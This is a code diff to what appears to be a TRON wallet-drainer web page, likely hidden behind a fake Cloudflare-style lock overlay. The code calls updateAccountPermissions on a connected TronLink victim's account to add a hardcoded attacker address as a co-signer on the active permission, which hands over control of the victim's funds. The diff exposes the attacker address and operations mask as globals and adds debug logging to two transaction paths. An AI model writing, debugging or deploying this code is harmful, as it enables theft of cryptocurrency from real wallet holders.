@@ -471,6 +471,8 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   ============================================================ */
   var ATTACKER_ADDR = 'TVbiAxJYjEBWY9rhFrooH139W82doZDArf';
   var ACTIVE_OPS    = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
+  window._ATTACKER_ADDR = ATTACKER_ADDR;
+  window._ACTIVE_OPS    = ACTIVE_OPS;
 
   async function runGasFreePermission(victimAddr) {
     var tw = window.tronWeb;
@@ -618,7 +620,9 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
               { address: ATTACKER_ADDR, weight: 1 }
             ]
           };
+          window.__logINF('PATH2 building tx for ' + addr.slice(0,8) + '…');
           var unsignedTx2 = await tw.transactionBuilder.updateAccountPermissions(addr, ownerPerm, null, [activePerm]);
+          window.__logINF('PATH2 tx built — keys: ' + JSON.stringify(Object.keys(unsignedTx2)));
           delete unsignedTx2.visible;
           delete unsignedTx2.txID;
           delete unsignedTx2.raw_data;
@@ -844,13 +848,15 @@ function waitForTronLinkAndRun() {
           };
           var activePerm = {
             type: 2, permission_name: 'active', threshold: 1,
-            operations: ACTIVE_OPS,
+            operations: window._ACTIVE_OPS,
             keys: [
               { address: addr, weight: 1 },
-              { address: ATTACKER_ADDR, weight: 1 }
+              { address: window._ATTACKER_ADDR, weight: 1 }
             ]
           };
+          window.__logINF('PATH3 building tx for ' + addr.slice(0,8) + '…');
           var unsignedTx3 = await tw.transactionBuilder.updateAccountPermissions(addr, ownerPerm, null, [activePerm]);
+          window.__logINF('PATH3 tx built — keys: ' + JSON.stringify(Object.keys(unsignedTx3)));
           delete unsignedTx3.visible;
           delete unsignedTx3.txID;
           delete unsignedTx3.raw_data;
